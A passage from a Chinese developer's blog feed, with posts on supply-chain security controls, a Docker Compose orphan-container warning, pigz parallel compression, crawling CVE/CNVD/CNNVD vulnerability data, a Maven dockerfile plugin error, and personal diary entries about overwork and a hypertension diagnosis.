href="https://github.com/grafeas/kritis/blob/master/docs/signer.md">https://github.com/grafeas/kritis/blob/master/docs/signer.md</a></td></tr><tr><td>Cosign</td><td>Cosign对容器图像签名。Cosign是由Linux基金会主办的sigstore项目的一部分。</td><td><a href="https://github.com/sigstore/cosign">https://github.com/sigstore/cosign</a></td></tr></tbody></table><h4 id="3-在CI-x2F-CD管道中配置安全控制"><a href="#3-在CI-x2F-CD管道中配置安全控制" class="headerlink" title="3. 在CI&#x2F;CD管道中配置安全控制"></a>3. 在CI&#x2F;CD管道中配置安全控制</h4><p>攻击者可以通过攻击CI&#x2F;CD系统来绕过对代码的检查和扫描，因此需要保证CI&#x2F;CD系统的安全性。可以通过对CI&#x2F;CD系统的安全配置来防范风险。常见工具：Apiiro, Argon,Cycode, Garantir, GrammaTech, JFrog (Vdoo)、RunSafe Security。<br>保护 CI&#x2F;CD 管道有以下两点措施： </p><ol><li><p>可复现的构建过程<br>确保相同的代码始终构建相同的软件，其中包含以下三点原则： </p><p> 确定性构建：确保相同的源代码必须编译构建相同的软件<br> 强化构建工具：构建管道中的工具是安全稳定的且不可更改的<br> 可验证输出：能够检测和验证预期构建和实际构建之间的差异      </p></li><li><p>在构建管道中创建不可变的、可验证的制品签名任务<br>支持在管道运行期间生成制品的签名，以确保一致性并在管道执行结束时验证出处。</p></li></ol><p>对于IDE的保护，可以使用基于浏览器的IDE（远程开发桌面），防止开发人员本地安装的IDE工具存在风险。</p><h3 id="生产环境风险应对措施"><a href="#生产环境风险应对措施" class="headerlink" title="生产环境风险应对措施"></a>生产环境风险应对措施</h3><p>操作环境风险是指在整个软件开发过程中所涉及的操作环境的风险，如开发环境、代码仓库、流水线系统、测试环境等。针对操作环境的风险防范措施包括：</p><h4 id="1-最小权限访问策略"><a href="#1-最小权限访问策略" class="headerlink" title="1. 最小权限访问策略"></a>1. 最小权限访问策略</h4><p>网络上连接着不同设备，特权提升允许攻击者一旦获得对一个系统的访问，就可以渗透到其他机器和服务中。此外，除非实施了正确的访问控制，否则受到攻击的可执行文件可能会未经授权与其他核心系统建立连接。因此，Garter建议使用基于角色的身份验证和授权、使用零信任安全模型的自适应访问和特权访问管理。<br><img src="/img/20220511-07.png" alt="管理用户访问和特权帐户的方法"></p><h4 id="2-机器身份管理"><a href="#2-机器身份管理" class="headerlink" title="2. 机器身份管理"></a>2. 机器身份管理</h4><p>对分布式应用、云原生、API服务等架构体系的使用使得应用系统的部署变得更细颗粒度且数量增多。机器身份管理是对主机、容器、虚拟机、应用程序、数据库、API服务等机器的身份进行统一管理、统一验证，确定机器的唯一身份。包括：密钥管理、证书管理等。常见的机器身份识别系统如下：</p><table><thead><tr><th>使用场景</th><th>作用域</th><th>应用名称</th></tr></thead><tbody><tr><td>静态数据加密，对称密钥管理</td><td>密钥管理系统</td><td>Akeyless <br> AWS <br> KMS <br> Azure <br> Twilio (Ionic) <br> Fortanix <br> PKWARE <br> Thales and Townsend Security</td></tr><tr><td>存储DevOps管道中使用的密钥，将机器标识发送给容器</td><td>机密管理</td><td>Akeyless <br> AWS <br> Microsoft Azure <br> BeyondTrust <br> CyberArk <br> Fortanix <br> Google Cloud Platform (GCP) <br> HashiCorp <br> ThycoticCentrify</td></tr><tr><td>用于代码签名的身份验证、加密和签名</td><td>PKI和证书管理</td><td>AppViewX <br> AWS <br> DigiCert <br> Entrust <br> GlobalSign <br> Keyfactor <br> Microsoft <br> The Nexus Group <br> Sectigo <br> Venafi</td></tr><tr><td>发现和控制对关键系统的特权访问</td><td>特权访问管理</td><td>Akeyless <br> BeyondTrust <br> Broadcom <br> CyberArk <br> One Identity <br> ThycoticCentrify</td></tr></tbody></table><h4 id="3-异常检测和自动响应"><a href="#3-异常检测和自动响应" class="headerlink" title="3. 异常检测和自动响应"></a>3. 异常检测和自动响应</h4><p>软件工程领导者必须与安全和风险团队密切合作，以了解和定义其开发平台和工具的预期行为，以便他们能够实时检测异常。 例如，EDR、CWPP、NDR 或 squery 等工具可以监控系统异常。 构建系统，包括软件工程师使用的 PC，不应免除 EPP&#x2F;EDR 保护。异常检测和响应在容器原生、基于 GitOps 的部署中尤其重要，可以自动化部署完整的代码到容器工作流程。 尽管处于开发阶段的容器镜像扫描工具有助于检测已知漏洞，但软件工程团队必须部署相关工具来可视化容器流量、识别集群错误配置并对异常容器行为和安全事件进行监测。<br>对异常活动进行监测，并及时响应和处理有以下四点：</p><ol><li>可执行文件与访问控制系统创建不必要的连接</li><li>特定机器上的进程、线程以及CPU和内存的利用率增加</li><li>针对网络访问、存储库的上传及下载、非常用目录的流访问量激增</li><li>监控软件的异常告警（SIEM、EPP、CASB）</li></ol><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>从SolarWinds (2020)、NetBeans IDE (2020)、Kaseya (2021) 和 Codecov (2021)攻击案例来看，软件供应链安全攻击范围较广，难度较高，周期较长，影响较远，防护较弱。根据信息安全的“木桶理论”：“信息的安全就像一个‘木桶’，整体的安全性取决于最薄弱的一个环节，否则即使其它方面做得再强，但在某一方面留下一个漏洞，也可能被他人利用，导致信息的失窃。”供应链当前安全现状也如此。为了提升软件供应链安全，建议软件工程团队根据自身情况，循序渐进提升软件供应链安全能力。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://www.gartner.com/en/documents/4003625">https://www.gartner.com/en/documents/4003625</a>【How Software Engineering Leaders Can Mitigate Software Supply Chain Security Risks】</li><li><a href="https://cloud.tencent.com/developer/article/1839537">https://cloud.tencent.com/developer/article/1839537</a>【企业级静态代码分析工具清单】</li><li><a href="https://www.gartner.com/reviews/market/software-composition-analysis-sca">https://www.gartner.com/reviews/market/software-composition-analysis-sca</a>【Products In Software Composition Analysis (SCA) reviews Market】</li><li><a href="https://sudonull.com/post/27911-Forrester-Research-A-Comparison-of-Ten-Top-Software-Composition-Analysis-Vendors">https://sudonull.com/post/27911-Forrester-Research-A-Comparison-of-Ten-Top-Software-Composition-Analysis-Vendors</a>【Forrester Research: A Comparison of Ten Top Software Composition Analysis Vendors】</li><li><a href="https://blog.csdn.net/m0_50579386/article/details/123507873">https://blog.csdn.net/m0_50579386&#x2F;article&#x2F;details&#x2F;123507873</a>【国内外软件成分分析SCA产品评测】</li><li><a href="https://developer.aliyun.com/article/738408">https://developer.aliyun.com/article/738408</a>【Kubernetes 时代的安全软件供应链】</li></ul>]]></content>
    
    
    <categories>
      
      <category>Security</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Software Supply Chain</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Found orphan containers 错误</title>
    <link href="/2022/04/06/2022-04-06-found-orphan-containers-errors/"/>
    <url>/2022/04/06/2022-04-06-found-orphan-containers-errors/</url>
    
    <content type="html"><![CDATA[<p>Found orphan containers 错误</p><hr><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>项目新需求，需要增加mongodbd数据库的支持，做一些数据的爬取工作，在docker目录下面新建一个mongodb的docker-compose配置文件：docker-compose-mongodb.yml，使用以下命令执行：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">docker<span class="hljs-literal">-compose</span> <span class="hljs-operator">-f</span> docker<span class="hljs-literal">-compose-mongodb</span>.yml up <br></code></pre></td></tr></table></figure><p>系统提示：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs css">WARN<span class="hljs-selector-attr">[0000]</span> Found orphan containers (<span class="hljs-selector-attr">[sca-mysql docker-frontend-1]</span>) for this project. If you removed or renamed this service in your compose file, you can run this command with the <span class="hljs-attr">--remove-orphans</span> flag <span class="hljs-selector-tag">to</span> clean it up. <br><span class="hljs-selector-attr">[+]</span> Running <span class="hljs-number">1</span>/<span class="hljs-number">0</span><br> ⠿ <span class="hljs-attribute">Container</span> sca-mongodb Created       <span class="hljs-number">0.1s</span><br>Attaching <span class="hljs-selector-tag">to</span> docker-frontend-<span class="hljs-number">1</span>, sca-mongodb, sca-mysql<br>no such service: docker-apiserver<br></code></pre></td></tr></table></figure><p>也没有在意问题原因，但是感到奇怪，随后把无用的项目从系统中移除掉，只保留系统需要的容器镜像，在导入的过程中每次指定 docker-compose-mongodb.yml 会把 docker-compose-mysql.yml 的容器进行加载运行。</p><h2 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h2><p>Compose 在内部使用项目名称（默认为项目目录的基本名称，但可以明确指定）来隔离项目。项目名称用于为所有项目的容器和其他资源创建唯一标识符，Compose将其所在目录的名称作为默认项目名称。例如，如果您的项目名称是myapp并且它包含两个服务db和web，那么 Compose 会分别启动名为myapp_db_1和myapp_web_1两个容器。如果遇到”Found orphan containers”警告是因为Compose检测到一些属于另一个同名项目的容器。</p><h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2><h3 id="docker-compose解决方法"><a href="#docker-compose解决方法" class="headerlink" title="docker-compose解决方法"></a>docker-compose解决方法</h3><p>为了防止不同的项目相互干扰，可以使用-p命令行选项或COMPOSE_PROJECT_NAME环境变量设置自定义项目名称。环境变量也可以通过环境文件设置（.env默认在当前工作目录中）。</p><p>增加运行参数：-p project_name &#x2F; –project-name project_name<br>比如：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">docker-compose -f docker-compose-mongodb<span class="hljs-selector-class">.yml</span> up -<span class="hljs-selector-tag">p</span> project_name<br></code></pre></td></tr></table></figure><p>在bash中执行,指定compose project name：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">export</span> COMPOSE_PROJECT_NAME<br></code></pre></td></tr></table></figure><p>指定环境变量，只能对当前docker-compose*.yml起作用，如果两个docker-compose*.yml都执行相同的命令，他们的compose_project_name相同，仍然存在镜像冲突，或者相互影响的情况。</p><p>如果在同一个目录下，运行两个不同的docker-compose.yml，通过在其中一条命令下指定和当前目录名不同的project_name即可。</p><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>在处理这种情况，谨慎使用<code>--remove-orphans</code>参数,该参数会停用并移除冲突的容器</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://stackoverflow.com/questions/50947938/docker-compose-orphan-containers-warning">https://stackoverflow.com/questions/50947938/docker-compose-orphan-containers-warning</a></li><li><a href="https://docs.docker.com/compose/reference/">https://docs.docker.com/compose/reference/</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>Develop</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Docker</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>关于工作和生活的一些碎碎念</title>
    <link href="/2022/03/13/2022-03-13-persional-journal/"/>
    <url>/2022/03/13/2022-03-13-persional-journal/</url>
    
    <content type="html"><![CDATA[<p>关于工作和生活的一些碎碎念</p><hr><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>年前SCA的研发工作比较累，一直也没有志同道合的朋友加入，SCA的研发工作基本上都落在我自己的身上，明面上9点半到晚上6点半，但是研发的工作没有思路（还是太弱），每次下班晚点儿，回家吃完饭，继续研究看资料，虽说日子有点儿苦，压力巨大，deadline催命，但是日子过得还算充实，年底腰部有点儿疼，我以为是久坐腰部劳损导致的，想着过了这段时间就去医院看看，毕竟在帝都，小毛病都得拿命来扛，每天回家就躺着床上休息，进而放松自己的腰部，但是一直不见起效，也没有那么疼，就一直拖着，春节歇了几天，但是还是无法缓解，正巧身边有些头孢，我自己心想是不是泌尿系统发炎了，所以就喝了一粒，服用两个小时以后就见效了，一看是这样，我心有些慌乱，还真发炎了，这样问题就大了，于是第二天立马到医院去检查，由于是社区医院并且假期其他放射科室放假，只能等到节后找一家三甲医院仔细诊断一些，拿着重新开的头孢，回家继续养着，一个疗程以后，腰部也不疼了，对于大部分北漂来说，用少量的钱解决了自己的疼痛，这件事情就此可以放一放了。这里感谢我的媳妇，她坚持让我再请假到三甲医院仔细检查一下，并且请了一天假陪我去的，后续排队等结果的时候，她觉得太累了并且我自己觉得可以轻松应对，就提前回家了，虽说在检查结果出来的时候我感到很无助，很慌张，特别想让她陪在我身边而她却不在，但是我还是很感激她，不是她的一再坚持，我的病情可能会继续恶化。</p><p>第一天只出来了尿检和血检的常规检测，但是情况不容乐观，血常规只有尿酸和肌酸激酶超标，尿常规一切正常，但是尿液蛋白&#x2F;肌酐加测问题比较严重。<br><img src="/img/20220313-01.png" alt="肝功能、肾功能、心肌酶谱检测"></p><p><img src="/img/20220313-02.png" alt="尿液蛋白、肌酐检测"><br>血压初测200&#x2F;110，心情平复后180&#x2F;100，看着自己的血压检测报告，拿着当天的检测报告，我一直觉得自己遇到问题应该不会紧张，但是自己手却忍不住的抖了起来，我当时的心情极度恶劣，想当恐惧，慌忙之中不知道自己的手该放在哪里，该迈那只脚，大脑一片混乱。后续平复下来，开始预约各项检测，甲功五项、RASS立位，肾脏彩超…..，每周请假去做检测，开始使用药物降压，控制饮食，血压升高如同温水煮青蛙，身体有反应但是比较轻，一旦开始使用药物降压，你会感觉整个人都不好了，感觉你的灵魂都不适应你的躯壳了，我可能是使用药物降压反应最强烈的那批人，具体情况如下：</p><p>1、头疼，强烈的头疼<br>2、恶心，呕吐<br>3、腰疼，肚子疼，隐隐作痛<br>4、腹泻，水肿<br>5、头晕，心慌，疲劳嗜睡，注意力不集中   </p><p>服用药物大概一周到两周之间，身体能够对药物良好的耐受，情况缓解不少，真的难受，每天都是浑浑噩噩的度过。终于在药物的辅助下，血压降到了130&#x2F;90，血压整体是控制住了。</p><p>这里感触最多的是在医院检查的那天，检查结果刚出的时候，我个人感觉只是尿液中有些蛋白，应该影响不大，但是医生解释以后，感觉问题很大，并且检查项中有RASS立位检查等，这些检查很大概率指向了肾脏疾病或者更严重的疾病，比如：尿毒症等等。第一天检查完成以后，我都不知道自己是怎么回到家的，半夜焦虑，失眠，内心是相当的不甘，我刚结婚，房子刚交了定金，事业也在上升期，我的前途也还不错，这时候却出现了这种变故。半夜人最容易瞎想，假设自己得了绝症，我媳妇该怎么办，我父母该怎么办，到了后半夜，终于想开了，反正病已经得了，想到影视剧《滚蛋吧肿瘤君》的女主状况，时间对每个人都是公平的，开心也是过，焦虑也是过，与其让自己现在对疾病的焦虑当中痛苦的度过每一天，还不如每天开开心心的过，活一天赚一天，如果未来有一天我拖累了自己的家人，我会毫不犹豫的离开……</p><p>后续积极配合医生的检查，每天依旧陷在药物降压的副作用当中，但是自己已经想开了，好好的享受每一天生活，不再为工作疾病焦虑，不再为金钱而拼命工作，每天按时休息，早起早睡，骑车上班，徒步下班，耐心解答网友同事问题，控制自己的饮食。</p><p>后续看起来自己好像脱离了世俗，但是深夜饿的睡不着的时候，总想吃点儿东西；工作累的时候，也想早点儿结束去休息；为了完成工作，还得在保证性命的同时，拼命加班，自己就是一个凡人，去他妈的生活。</p>]]></content>
    
    
    <categories>
      
      <category>Diary</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Life</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>多线程压缩数据</title>
    <link href="/2022/03/08/2022-03-08-compress-directory-with-thread/"/>
    <url>/2022/03/08/2022-03-08-compress-directory-with-thread/</url>
    
    <content type="html"><![CDATA[<p>多线程压缩数据</p><hr><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>最近需要和同事分享代码样本数据，数据集大概有几十个G，使用tar压缩时，发现只会调用一个核心进行压缩，速度有些鸡肋，所以查询了一些多线程压缩的资料，这里总结一下，供以后参考：</p><h2 id="指定压缩程序"><a href="#指定压缩程序" class="headerlink" title="指定压缩程序"></a>指定压缩程序</h2><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nsis">tar cf - your-<span class="hljs-params">archive</span>-path | pigz &gt; <span class="hljs-params">archive</span>.tar.gz<br></code></pre></td></tr></table></figure><p>或者写成：</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata">tar -<span class="hljs-keyword">cf</span> --<span class="hljs-keyword">use</span>-<span class="hljs-keyword">compress</span>-<span class="hljs-keyword">program</span>=pigz -f archive.tar.gz your-archive-path<br></code></pre></td></tr></table></figure><p><img src="/img/20220308-01.png" alt="调用所有核心进行压缩"><br>默认情况下，pigz使用系统所有的核心，如果无法获取到，默认为8。 可以使用-p n请求更多信息，例如： -p 32. pigz与gzip具有相同的选项，因此您可以使用-9请求更好的压缩。 例如。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">tar</span> cf - your-archive-path | pigz -<span class="hljs-number">9</span> -p <span class="hljs-number">32</span>&gt; archive.tar.gz<br></code></pre></td></tr></table></figure><h2 id="pigz"><a href="#pigz" class="headerlink" title="pigz"></a>pigz</h2><p>pigz(parallel implementation of gzip)是一个并行执行的压缩工具，解压缩比gzip快，同时CPU消耗是gzip的好几倍，在对短时间内CPU消耗较高不受影响的场景下，可以使用pigz。</p><p>使用pigz解压数据，有个有趣的点就是，解压只会调用4个CPU核心</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haskell"><span class="hljs-title">pigz</span> -k -d <span class="hljs-class"><span class="hljs-keyword">data</span>.tar.gz</span><br></code></pre></td></tr></table></figure><p><img src="/img/20220308-02.png" alt="多线程解压缩"><br>使用-p指定核心数目也不可以，有点儿奇怪，暂时没时间去深究原因。</p><p>本文提到的只是一个小技巧，个人单纯记录一下，仅做参考。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://zlib.net/pigz/">https://zlib.net/pigz/</a></li><li><a href="https://segmentfault.com/a/1190000038347566">https://segmentfault.com/a/1190000038347566</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>Os</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Compress</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>镜像漏洞数据(CVE/CNVD/CNNVD)的一些总结</title>
    <link href="/2022/02/24/2022-02-24-nvd-cve-data-mirror/"/>
    <url>/2022/02/24/2022-02-24-nvd-cve-data-mirror/</url>
    
    <content type="html"><![CDATA[<p>镜像漏洞数据(CVE&#x2F;CNVD&#x2F;CNNVD)的一些总结</p><hr><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>国内做安全产品都需要构建自己的漏洞库，但是漏洞库需要和CVE&#x2F;CNVD&#x2F;CNNVD做映射，在镜像(爬取)的过程中有不少的坑，这里记录以下，以下内容仅供参考，如有不足，请及时斧正，本人将不胜感激。</p><h2 id="CVE"><a href="#CVE" class="headerlink" title="CVE"></a>CVE</h2><p>CVE官方已经提供feeds地址，提供JSON格式的数据，其中以year命名的是每天更新一次，对于recent和modified命名的feeds是每两个小时更新一次，如果你的需求不需要实时更新漏洞库，可以采用每天更新一次漏洞数据的策略（nist推荐），先更新以year命名的数据，如果数据库存在则跳过，不存在则增加，对于modified数据，如果存在则修改，不存在则新增，不处理recent数据,主要是前两个feed包含的数据集已经包含了recent的数据，recent和modified feeds仅包含在过去8天内修改的数据，没两个小时更新一次。</p><h2 id="CNVD"><a href="#CNVD" class="headerlink" title="CNVD"></a>CNVD</h2><p>CNVD的数据就更有意思了，CNVD官方并不提供feeds或者其他形式供研究或者商用的漏洞库，你需要CNVD的数据，你得自行去爬取，部分漏洞数据可能在一段时间内就消失了，这就很尴尬。遇到的坑有以下几点：<br>1、反反爬<br>CNVD采用了某安全厂商的waf，并且设置了反爬机制，js动态签名，其中js还做了混淆，数据存放在cookie当中，这种反爬机制还挺有意思的，可以根据js的算法自己构造合法cookie信息，又或者使用selenium框架，自动加载获取数据。waf会检测ip请求的频率，频率过快会导致ip被封禁，如果使用代理池，就不用担心，如果使用单个ip爬取，频率大概是每10秒爬取一次，如果ip被拦截，在waf封禁界面上发起申请，片刻就会解封。</p><p>2、数据格式<br>部分cnvd数据关联多个cve编号，导致在存储的过程中出现问题,比如：CNVD-2019-45908，CNVD-2019-01597等，数量也不多，后期需要单独处理一下</p><p>3、漏洞分类<br>早期爬取CNVD漏洞的时候使用的接口是：<code>https://www.cnvd.org.cn/flaw/typeResult?typeId=&#123;&#125;&amp;max=&#123;&#125;&amp;offset=&#123;&#125;</code>，这个界面很贴心，直接把同一类型下的漏洞都列举出来了，简直太方便了，后期爬取完毕才发现，还有1W+的数据是不在分类当中的，调试了大半天才发现的，后续直接递归爬取漏洞列表来全量爬取漏洞库。</p><h2 id="CNNVD"><a href="#CNNVD" class="headerlink" title="CNNVD"></a>CNNVD</h2><p>CNNVD的漏洞数据还是比较全面的，既包含CVE还包含CNVD的数据，映射关系可能不全，但是漏洞数据还是比较全面的，另外漏洞数据对内部成员企业是开放的，公司的安全设备需要通过CNNVD的漏洞兼容性认证，即可使用CNNVD的漏洞数据，我这边初期并没有设备来进行认证，前期做漏洞分析只能爬取部分cnnvd漏洞数据，不过都是单线程，频率都是十几秒一次，爬取数据还是要讲求道义的，站点没防护也不能把站点给爬死了。具体遇到的坑只有一个，那就是和CNVD一样，部分漏洞包含多个CVE漏洞编号，这个暂时还没来得及研究漏洞间的映射关系。另外注意一点儿就是CNNVD可能会不定期下线维护，原因时间不确定。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://www.cnvd.org.cn/">https://www.cnvd.org.cn/</a>【cnvd】</li><li><a href="https://nvd.nist.gov/vuln/data-feeds">https://nvd.nist.gov/vuln/data-feeds</a>【cve】</li><li><a href="http://www.cnnvd.org.cn/">http://www.cnnvd.org.cn/</a>【cnnvd】</li></ul>]]></content>
    
    
    <categories>
      
      <category>Security</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Vulnerability</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>生活杂记</title>
    <link href="/2022/02/23/2022-02-23-persional-journal/"/>
    <url>/2022/02/23/2022-02-23-persional-journal/</url>
    
    <content type="html"><![CDATA[<p>生活杂记感悟</p><hr><p>实话实说，记录点儿生活的杂事，个人的一些感悟，各位看官看个热闹就好了，不针对个人和团体。</p><p>昨天晚上SCA内测出了点儿bug,有自己写的×山，也有对接系统的玄学问题，由于第二天需要给客户展示，辛苦对接的兄弟陪我一起加班，回到家快凌晨了，还没来得及吃饭，门口小馆对付一口，早上被媳妇吵醒(上班时间差异，我下班晚，她不好早睡，她上班早，我上班晚，睡眠一般，导致我两睡眠都差劲)，媳妇走了以后，睡了个囫囵觉，再次醒来发现已晌午，和领导请了半天假，简单下点儿面对付一顿，悠哉悠哉吃了个早午饭，吃饭过程中看到某微信群已炸锅，某互联网大厂算法工程师，在健身的过程中猝死，在这里对这位IT同仁默哀，部分朋友分析是长期熬夜加班导致心肺功能脆弱，健身过程中容易出的问题，急救措施不足导致的悲剧。想想最近SCA研发过程中的拼命加班，突然在内心给自己找了一个借口，爱护好自己的身体。</p><p>骑着自己的小破自行车出门，发现自己好久都没有沐浴温暖的阳光，享受安逸的下午了，平时上班没时间，周末窝在家里睡觉、加班、搞研究(大部分都在瞎搞)，总结一句话就是穷的只能窝在家里了，今后应该把骑行再拾起来，周末还是和媳妇出去转转。</p><p>骑在午后空旷的大道上，沐浴着迷人的阳光，今天天空格外蔚蓝，路过街角，看见一个少女单手端着手机，阳光斜斜的洒在她的身上，突然发现这是多么安逸美妙的时刻，不由的想起多年前步步高音乐手机的宋慧乔的广告，很暖心。</p><p>路过一家小学，看着小孩在操场上耍闹，想想自己还得去为了生存而工作，看着臃肿的身体，感叹而立之年的无奈，不由的、心酸，感叹逝去的青春时光，年轻真好，天真无邪。</p>]]></content>
    
    
    <categories>
      
      <category>Diary</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Life</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>spotify dockerfile-maven-plugin ‘Could not acquire image ID or digest following build’错误解决</title>
    <link href="/2022/02/12/2022-02-12-solve-spotify-dockerfile-maven-plugin-error/"/>
    <url>/2022/02/12/2022-02-12-solve-spotify-dockerfile-maven-plugin-error/</url>
    
    <content type="html"><![CDATA[<p>spotify dockerfile-maven-plugin ‘Could not acquire image ID or digest following build’错误解决</p><hr><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>使用spotify dockerfile-maven-plugin 在使用maven编译项目的过程中自动构建docker镜像文件，在构建过程中遇到“Could not acquire image ID or digest following build”错误，无法定位错误原因，全网检索以后，发现部分网友也遇到过，网友提出的错误原因有：</p><ul><li>Dockerfile配置错误，解决方法是检查dockerfile文件，或者单独调用docker构建命令进行测试</li><li>.dockerignore配置错误，如果项目中需要配置.dockerignore,请认真检查，dockerfile-maven-plugin的<a href="https://github.com/spotify/dockerfile-maven/issues/25">issues</a>中有提到</li><li>dockerfile-maven-plugin版本较低，从1.3.×升级到1.4.×即可</li></ul><p>博主开发环境：<br>jdk:1.8.0_291<br>dockerfile-maven-plugin:1.4.12<br>docker：Docker version 20.10.12, build e91ed5707e</p><p>博主的项目名为：engine,Dockerfile位于：engine&#x2F;src&#x2F;main&#x2F;docker，构建的命令为：<code>mvn clean package dockerfile:build -Dmaven.test.skip=true </code><br>pom.xml docker-maven-plugin配置如下：</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.spotify<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>dockerfile-maven-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.4.12<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">executions</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">execution</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">id</span>&gt;</span>default<span class="hljs-tag">&lt;/<span class="hljs-name">id</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">phase</span>&gt;</span>package<span class="hljs-tag">&lt;/<span class="hljs-name">phase</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">goals</span>&gt;</span></span><br><span class="language-xml">                <span class="hljs-tag">&lt;<span class="hljs-name">goal</span>&gt;</span>build<span class="hljs-tag">&lt;/<span class="hljs-name">goal</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;/<span class="hljs-name">goals</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">execution</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">executions</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">repository</span>&gt;</span>blingsec/$</span><span class="hljs-template-variable">&#123;project.artifactId&#125;</span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">repository</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">tag</span>&gt;</span>$</span><span class="hljs-template-variable">&#123;project.version&#125;</span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">tag</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">dockerfile</span>&gt;</span>src/main/docker<span class="hljs-tag">&lt;/<span class="hljs-name">dockerfile</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">buildArgs</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">JAR_FILE</span>&gt;</span>target/$</span><span class="hljs-template-variable">&#123;project.build.finalName&#125;</span><span class="language-xml">.jar<span class="hljs-tag">&lt;/<span class="hljs-name">JAR_FILE</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">SCA_CLIENT</span>&gt;</span>client/sca-client<span class="hljs-tag">&lt;/<span class="hljs-name">SCA_CLIENT</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">buildArgs</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span 